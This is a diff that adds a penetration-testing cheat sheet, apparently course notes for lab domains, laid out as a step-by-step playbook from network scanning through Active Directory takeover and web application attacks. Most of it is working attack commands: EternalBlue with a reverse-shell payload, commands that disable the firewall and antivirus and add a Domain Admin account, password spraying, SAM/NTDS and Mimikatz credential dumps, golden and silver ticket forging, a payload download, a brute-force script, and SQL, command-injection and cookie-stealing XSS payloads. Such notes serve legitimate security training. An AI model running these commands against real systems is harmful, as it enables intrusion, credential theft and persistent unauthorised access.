@@ -1,0 +1,493 @@
+1. Information Gathering
+
+a. Scan for all IP addresses in the given network == Using Sudo, scan for IP Address alive in the network. You can either use your current IP Address or input an IP Address to scan.
+	i.) sudo arp-scan $IP_Address
+	
+b. Perform Network Mapping
+	i.) Scan for Services, Operating Versions in each host using NMAP
+		sudo nmap -sV -Pn -vv -O $IP_Address
+		
+		record down each type of server and the important services running on them.
+		example: HTTP services, LDAP Services
+		HTTP - Web Server
+		LDAP - Active Directory Server
+		
+	ii.) Scan for all Open Ports using MassScan
+		 sudo massscan -p1-65535,U:1-65535 $IP_Address --rate 2500000
+
+=====================================================================
+2. Vulnerability Analysis:
+a. Access each HTTP service manually by going to the browser and typing each IP in the URL.
+	i.) Record down each of the details manually for now.
+	
+b. Find more information about the WebServices / Servers
+	- Look for misconfigurations (default credentials, open shares(SMB/RPC) )
+	- Investigate SSL/TLS configurations
+	- Check for Vulnerabilities in each server
+
+	i.) Check if Wordpress/files/resources are present using the tools: feroxbuster / nikto
+		1.) Feroxbuster
+			feroxbuster --url http://$IP_Address
+			
+		2.) nikto
+			nikto -host=http://$IP_Address
+		
+		Both should reveal if Wordpress services or any files are present
+		
+	ii.) Run Dirb on them to find directories on webservers
+			dirb http://$IP_Address
+			
+	iii.) Autorecon - if you have time, you can run autorecon for more enumeration
+			autorecon $IP_Address
+			
+c. Scan for Vulnerabitlies in each host using NMAP
+		i.) sudo nmap --script=vuln -sV -Pn $IP_Address
+			
+d. Investigate SSL/TLS configurations
+		i.) sslscan $IP_Address:Port_Number
+	
+e. Search for Exploits
+		i.) Using Msfconsole
+		ii.) searchsploit
+			searchsploit ms17-010
+			
+
+=====================================================================
+3.) Network Exploitations
+
+a. Network Exploitation
+	i.) Domain Enumeration
+		a.) Powershell - 
+		
+		Get the AD user called Dave : Get-ADUser -Identity "Dave"
+		Get the ADGroup details called ITAdmins : Get-ADGroup -Identity "ITAdmins"
+		Retrieves a list of all group objects in the Active Directory domain : Get-ADGroup -Filter *
+		Get all members of the group "Domain Members" : Get-ADGroupMember -Identity "Domain Admins"
+		Retrieves a list of all organizational units in the Active Directory domain : Get-ADOrganizationalUnit - Filter*
+		Lists the groups to which the user "John" belongs : Get-ADPrincipalGroupMembership -Identity "John"
+		
+		Retrieves the status of the Windows Update service : Get-Service -Name "wuauserv"
+		Lists all running services on the computer : Get-Service | Where-Object { $_.Status -eq "Running" }
+		Retrieves information about the Windows Explorer process : Get-Process -Name "explorer"
+		
+		Retrieve configuration settings for the domain profile : Get-NetFirewallProfile -Name Domain
+		Retrieves the configuration settings for all firewall profiles : Get-NetFirewallProfile -Name Domain,Private,Public
+		
+		b.) WMIC -
+		System Information
+		• OS: Retrieves information about the operating system.
+		• BIOS: Retrieves information about the BIOS.
+		• COMPUTERSYSTEM: Retrieves information about the computer system.
+		• BASEBOARD: Retrieves information about the baseboard (motherboard).
+		• CPU: Retrieves information about the CPU.
+		---Command: OS information : This command retrieves the operating system's name, version, architecture, and installation date.
+		wmic os get Caption, Version, OSArchitecture, InstallDate
+		
+		---Command: CPU information : Retrieves CPU details such as name, maximum clock speed, number of cores, and logical processors.
+		wmic cpu get Name, MaxClockSpeed, NumberOfCores, NumberOfLogicalProcessors
+		
+		Hardware
+		• MEMORYCHIP: Retrieves information about physical memory chips installed on the computer.
+		• DISKDRIVE: Retrieves information about disk drives.
+		• NICCONFIG: Retrieves network adapter configuration information.
+		• CDROM: Retrieves information about CD-ROM drives.
+		• PRINTER: Retrieves information about printers.
+		---Command: Memory information
+		wmic memorychip get Capacity, Speed, MemoryType
+		
+		---Command: Disk Drive information
+		wmic diskdrive get Model, Size, InterfaceType
+		
+		Software
+		• PRODUCT: Retrieves information about installed software products.
+		• SERVICE: Retrieves information about system services.
+		• SHARE: Retrieves information about shared resources.
+		• STARTUP: Retrieves information about programs configured to run at system startup.
+		• QFE: Retrieves information about installed hotfixes and updates.
+		---Command: installed software : Retrieves a list of installed software products along with their versions and vendors.
+		wmic product get Name, Version, Vendor
+		
+		---Command: system services : Retrieves running services along with their display names and startup modes.
+		wmic service where State='Running' get Name, DisplayName, StartMode
+
+		
+		Network
+		• NIC: Retrieves information about network adapters.
+		• NETCLIENT: Retrieves information about network client configurations.
+		• NETLOGIN: Retrieves information about network logon settings.
+		• NETUSE: Retrieves information about network connections.
+		• NICCONFIG: Retrieves network adapter configuration information.
+		---Command: Network Adaptor Information : Retrieves details about network adapters, including name, type, MAC address, and speed.
+		wmic nic get Name, AdapterType, MACAddress, Speed
+
+		
+		Security
+		• NTDOMAIN: Retrieves information about the domain or workgroup.
+		• USERACCOUNT: Retrieves information about user accounts.
+		• GROUP: Retrieves information about user groups.
+		• SHARE: Retrieves information about shared resources.
+		• LOGINSESSION: Retrieves information about user login sessions
+		---Command: User Account Information : Retrieves details about user accounts, including name, type, and status (disabled/enabled).
+		wmic useraccount get Name, AccountType, Disabled
+		
+		c.) rpcclient
+		To connect to a target machine using rpcclient:
+		command: 
+			rpcclient -U <domain>/<username>%<password> <target_ip>
+			rpcclient -U netsec.local/pentestme%12345678aA 192.168.64.141
+			
+		Enumerating
+		Commands:
+			Listing Users : enumdomusers
+			Listing Groups : enumdomgroups
+			Extract detailed user information : queryuser <username>
+			List the members of a domain group: querygroupmem <groupid>
+			Retrieve Password Policies : getdompwinfo
+			List all Shares: netshareenum
+			Change user Password: setuserinfo2 <username> 23 'newpassword'
+			
+			
+		d.) crackmapexec
+		general syntax for crackmapexec: 
+			<protocol>: The protocol to use (e.g., smb, ssh)
+			<target>: IP address, hostname, or IP range.
+			[options]: Additional options such as credentials, command execution, etc.
+		crackmapexec <protocol> <target> options
+		
+		Enumerating SMB Shares
+		To enumerate SMB shares on a target or range of targets:
+		crackmapexec smb 192.168.1.0/24 --shares
+
+		Enumerating Users
+		crackmapexec smb 192.168.1.0/24 -u 'username' -p 'password' --users
+		
+		e.) enum4linux
+		Attempt to get userlist / OS information from target
+		enum4linux -U -o IP_Address
+		
+		
+	ii.) Domain Exploitation (After getting access & having credentials)
+		a.) Leveraging PowerShell for Exploitation
+		
+		This command prompts for credentials and then opens Calculator on the target PC, demonstrating how you can execute arbitrary commands remotely:
+		Invoke-Command -ComputerName TARGET_PC -ScriptBlock { Start-Process "calc.exe" } -Credential (Get-Credential)
+		
+		Downloading Files from the Internet
+		Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "C:\temp\payload.exe" 
+		
+		Bypassing Execution Policy for Script Execution - This runs a PowerShell script while bypassing the execution policy for this instance only.
+		powershell.exe -ExecutionPolicy Bypass -File .\exploit.ps1 
+		
+		b.) Enumeration with Msfconsole
+		SMB Version Scanning - To identify the SMB version of a target machine, use the smb_version scanner:
+		This command scans the network for SMB services and identifies their versions, which is vital for understanding potential vulnerabilities
+		use auxiliary/scanner/smb/smb_version
+		
+		Extracting Kerberos Tickets - Kerberoasting exploits the Kerberos TGS (Ticket Granting Service) to crack the hash of service accounts:
+		use auxiliary/gather/kerberos_enumusers
+		set RHOSTS [Domain Controller IP]
+		set DOMAIN [Target Domain]
+		run
+		
+		Exploiting Windows with EternalBlue - EternalBlue, a well-known exploit for Windows, can be executed as follows:
+		use exploit/windows/smb/ms17_010_eternalblue
+		set RHOSTS [Target IP]
+		set PAYLOAD windows/x64/meterpreter/reverse_tcp
+		set LHOST [Your IP]
+		exploit
+		
+		run commands to do the following:
+		1. disable firewall: set command 'powershell set-netfirewallprofile -name public -enabled false'
+		2. disable antivirus: set command 'powershell set-MPPreference -DisableRealtimeMonitoring $true'
+		3a. create user: set command 'net user david2 1234567aA /add /domain'
+			add user to domain: set command 'net group "Domain Admins" david2 /add /domain
+		3b. create user using: msf post(windows/manage/add_user)
+		set AddToGroup true
+		set group 'Domain Admins'
+		set password '12345678aA'
+		set username david
+		
+				
+		c.) impacket
+		Using GetNPUsers.py -- used to get user accounts that do not have Kerberos Pre-Authentication to obtain TGTs for offline password cracking attempts:
+		impacket-GetNPUsers -dc-ip 192.168.64.141 netsec.local/ -usersfile users -request
+		
+		Using John the Ripper to crack the hash:
+		john hashes.txt
+		
+		Using hashcat to crack the hash - Replace hashes.txt with the file containing your extracted hashes or tickets, and wordlist.txt with your password wordlist:
+		hashcat -m 13100 -a 0 hashes.txt wordlist.txt
+				
+		d.) crackmapexec
+		Executes command on the target system:
+		crackmapexec smb 192.168.1.100 -u 'administrator' -p 'password' -x 'whoami'
+		
+		Dump credentials: This tries to dump SAM/NTDS database hashes, which can be cracked offline to reveal plaintext passwords:
+		crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --sam
+		crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --ntds
+		
+		Password Spraying: Password spraying involves attempting a single password against multiple user accounts, avoiding account lockouts due to multiple failed authentication attempts:
+		crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2023!' --continue-on-success
+
+		e.) evil-winrm
+		 If you got a username/password with hash and you want to get a shell from it, like a CMD/Powershell... you can use evil-winrm
+		 evil-winrm -i IP_Address -u administrator -p aad3b435b51404eeaad3b435b51404ee:05ea25098d1b3bf62d7b321d03235a52
+			
+	iii)Post Exploitation / Persistence
+		a.) Golden Ticket
+			1. Create a golden ticket
+				Things you need: SID, Domain, user, kerberos nthash
+				SID-domain-sid: S-1-5-21-3740544615-3584452696-2332589292
+				domain + user-domain: cfc.local administrator
+				kerberos nthash-nthash: 1ce3bebb61f5bf55cabce5d45a847f5f
+				command:
+				impacket-ticketer -nthash 1ce3bebb61f5bf55cabce5d45a847f5f -domain cfc.local administrator -domain-sid S-1-5-21-3740544615-3584452696-2332589292
+				
+				ticket will be saved as administrator.ccache
+				
+			2. KRB5CCNAME is a system variable the tool impacket-psexec is looking for: So we have to set a variable in the name of KRB5CCNAME and point it to the Golden ticket.
+				export KRB5CCNAME=/home/kali/Desktop/administrator.ccache
+				
+			3. Set the host file		
+				We need to set the Kali linux machine (the attacker's machine) to know that CFC.local means 192.168.244.139 - we can do it by using the /etc/hosts file (in Linux).
+
+			4. Now use the golden ticket - Impacket-psexec - allows you execute commands remotely on a windows system
+				impacket-psexec -k -no-pass domain/username:password@target cmd.exe
+				impacket-psexec -k -no-pass cfc.local/administrator@WIN-1222 cmd.exe
+		
+		
+		b.) Silver Ticket
+			1. Create a silver ticket - Silver Tickets can be used to access specific services within an AD environment by forging a service ticket (TGS) for that service.
+			Extract the NTLM hash of the service account: This is typically an account that runs a service like MSSQL, HTTP, or CIFS
+			Replace <service_account_NTLM_hash> with the NTLM hash of the service account.
+			<service_principal_name> is the SPN for the service you want to access (e.g.,HOST/mssqlsrv.domain.com).
+			This command generates a Silver Ticket, allowing access to the specified service:
+				impacket-ticketer -nthash <service_account_NTLM_hash> -domain-sid <domain_SID> -domain <domain_name> -spn <service_principal_name> admin 
+		
+			2. After generating a Silver Ticket, you can use it to access services like SMB:
+				export KRB5CCNAME=admin.ccache
+				smbclient -k //target_server/share
+			
+			This uses the Kerberos ticket cache to authenticate to the SMB service without needing the service's actual credentials
+			
+		c.) using MSFConsole
+		
+			1.) Getting Access First
+			a. use windows/smb/psexec
+			b. set smbpass : HASHVALUE
+			c. set user : administrator
+			d. set host: IP_Address
+			e. set smbdomain: netsec.local
+			f. run to get MeterPreter Access
+			
+			2.) In Meterpreter, Load kiwi : Kiwi - extension to meterpreter, to allow you to execute Mimikatz commands.
+			command: load kiwi
+			
+			3.) Make sure to operate in the correct architecture; otherwise you will not be able to extract data properly.
+			command: bg
+			check the meterpreter is it x86, if so need to migrate to x64
+			return back to meterpreter
+			command: sessions -1
+			
+			4.) Try to extract all credentials
+			command: creds_all
+			if no credentials, run command:
+			command: migrate -N winlogon.exe
+			Then, try command: creds_all again
+			
+			5.) Now try to retrieve kerberos tickets
+			from meterpreter, run the command:
+			command: kiwi_cmd 'kerberos::ptt'
+			
+		d.) From powershell to get tickets:
+			a.) klist - display the tickets
+			b.) kinit - will request DC a new ticket
+			
+			How to run?
+			powershell > kinit
+			powershell > klist
+				
+		e.) Ticket conversion & using tickets
+			a.)After getting ticket, you want to convert the ticket because:
+			
+			.ccache: for unix-linux machines, used by impacket-psexec… 
+			.kirbi: Mimikatz (using powershell)
+			.kirbi_base64: Kiwi  (Using meterpreter)
+				
+			How to convert? comamnd:
+			impacket-ticketConverter administrator.ccache administrator.kirbi
+			base64 administrator.kirbi > administrator.kirbi64
+			
+			b.) use administrator ticket assuming you got a non-elevated access
+			i.) from meterpreter, run command: 
+			kerberos_ticket_use administrator.kirbi64
+			
+			iii.) from mimikatz, run command:
+			kerberos::ptt <filename>
+		
+		f.) ssh-keygen (used for persistence)
+		commands in this sequence - in the other server - linux:
+			1. Generate the keys:
+			ssh-keygen -t rsa
+			
+			private key: id_rsa
+			public key: id_rsa.pub
+			
+			2. Put the public key inside the server we want to connect to (.ssh/authorized_keys)
+			cat ~/.ssh/id_rsa | wc -c 
+			cat ~/.ssh/id_rsa.pub | wc -cache
+			cat ~/.ssh/id_rsa.pub > ~/.ssh/authorized_key
+			
+			3. In the server, go to the following:
+			/etc/ssh/sshd_config
+			in the config file, look for:
+			#PubkeyAcceptedAlgorithms +ssh-rsa
+			uncomment it to become : PubkeyAcceptedAlgorithms +ssh-rsa
+			You should be able to login now.
+			
+			4. Now we can use the private key to connect from any place.
+			Using mobaxterm, use ssh:
+			Remote Host: IpAddress
+			Username: username that you used to generate the keys
+			port: 22
+			
+			Advanced SSH Settings:
+			X11-Forwarding: Yes
+			Compression: Yes
+			Remote Environment: interactive shell
+			ssh-browser type: SFTP Protocol
+			Use private key: placed where you stored the keys on your current machine
+		
+		
+		
+		
+		
+			
+=====================================================================
+4.) Web Application Exploitation
+
+	1. Information Gathering
+		a. Identify Technologies and Frameworks
+			Identify server technologies (Apache, Nginx, etc.)
+			Identify programming languages (PHP, Python, etc.)
+			Identify frameworks (WordPress, Joomla, etc.)
+			Identify databases (MySQL, PostgreSQL, etc.)
+
+		use Nikto to scan vulnerability on webservers:
+		nikto -url=$IP_Address -ask no
+
+		b. Directory and File Enumeration
+			Use tools like Dirb, to find hidden directories and files
+		dirb URL / Http://IP_Address
+		
+		
+		c. Check for SSL/TLS Issues
+			Test for SSL vulnerabilities using SSLScan or testssl.sh
+			
+		sslscan:
+		sslscan IP_Address:Portnumber / sslscan URL
+		
+		testssl:
+		git clone --depth 1 https://github.com/drwetter/testssl.sh.git
+		
+		bash testssl.sh/testssl.sh --log URL/IP_Address
+
+		d. Check for Comments in Source Code
+			Look for comments that may reveal sensitive information or credentials
+
+
+	2. WebServer Exploitation - Bruteforce
+		i.) Run wordpress scanner to scan if website has wordpress
+			wpscan --url $IP_Address -e at
+	
+		ii.) Bruteforce Wordpress using MSFConsole
+			msfconsole: search wordpress enum
+			
+		iii.) Bruteforce using BurpSuite
+			Use Bruteforce in BurpSuite for places with login like wordpress phpadmin
+			
+		iv.) Bruteforce using Curl - check if its post:
+		curl http://192.168.64.138/adv/control/ex8/php/login.php -X POST -d '{"username":"user","password":"password"}' 
+		write a script to bruteforce using a username list / password list
+		
+		script:
+		
+		#!/bin/bash
+
+		# Define the target URL, replace URL as necessary
+		url="http://192.168.64.138/adv/control/ex8/php/login.php"
+
+		# Loop through each user in user.lst
+		while read -r user; do
+			# Loop through each password in password.lst
+			while read -r password; do
+				# Send POST request with the current user and password
+				echo "Trying username: $user and password: $password"
+				response=$(curl -s -X POST "$url" \
+					-H "Content-Type: application/json" \
+					-d "{\"username\":\"$user\", \"password\":\"$password\"}")
+
+				# Check if the response contains the word "Login Success" #replace as necessary.
+				if echo "$response" | grep -q "Login Success"; then
+					echo "Login Success with username: $user and password: $password"
+					break 2 # Stop after finding a successful login
+				fi
+			done < password.lst
+		done < user.lst
+		========================================end========================================
+
+	3.) SQL/XSS/Command Injections
+		
+		a. SQL
+		i.) SQL injection: Test for classic SQL injection 
+			' OR 1=1--, UNION SELECT
+			1' OR '1'='1
+			1" OR "1"="1
+			A' OR 'A'='A
+			1'='1' OR '2='2
+		
+		To see if you can get the list of all tables in the database:
+		    • Shows 2 columns: 
+			1' UNION select table_schema,table_name FROM information_Schema.tables;#
+			• Shows 3 columns: 
+			1' UNION select table_schema,table_name,1 FROM information_Schema.tables;#
+			• Shows 4 columns:
+			1' UNION select table_schema,table_name,1,1 FROM information_Schema.tables;#
+			1' UNION select 1,1,1,1 FROM information_Schema.tables;#
+		
+		To see if you can get the list of all columns in a particular table: replace table_name/table_schema
+			1' UNION SELECT 1,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'PASSWORDS' AND table_schema = 'adv_injection';#
+			
+		Others injection: for updating SQL statement, you actually cannot select columns so you need to do this:
+		1'); UPDATE accounts SET password = '1' WHERE id = 8;
+		1'); UPDATE users SET balance = 2000000 WHERE id = 12;#
+
+		Use tools like SQLmap to automate SQLi testing
+		Though do not use SQLmap for screenshots.
+		ii.) 
+
+
+		b.) Command Injections
+		
+		Inject OS commands using characters like ;, |, &&, etc.
+		You can try like: for example a website to ping ipaddresses
+		8.8.8.8 &;& cd ../../../../../etc &;& cat passwd
+		
+		c.) XSS Injections
+		Stored XSS
+		Submit payloads like <script>alert(1)</script> in input fields that are stored in the database
+		
+		Reflected XSS - Submit XSS payloads in URL parameters
+		Use payloads like <img src=x onerror=alert(1)>
+		<a href="javascript:alert(document.cookie)">Click me</a>
+		<input type="text" value="XSS" onmouseover="alert(document.cookie)">
+		
+		
+		d.) Download latest command injections files
+		
+		e.) CURL Cheatsheets
+		Curling a website that you must use like a firefox agent and using a php session ID
+		--data where parameters you can get from the website
+		--PHPSESSID where you can get from the website cookie
+		
+		curl -i -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" --data "recipient_account=1&amount=1" -b "PHPSESSID=goh9mlcsl60rsmkbkamrskiif9" http://3.76.115.174/transfer.php
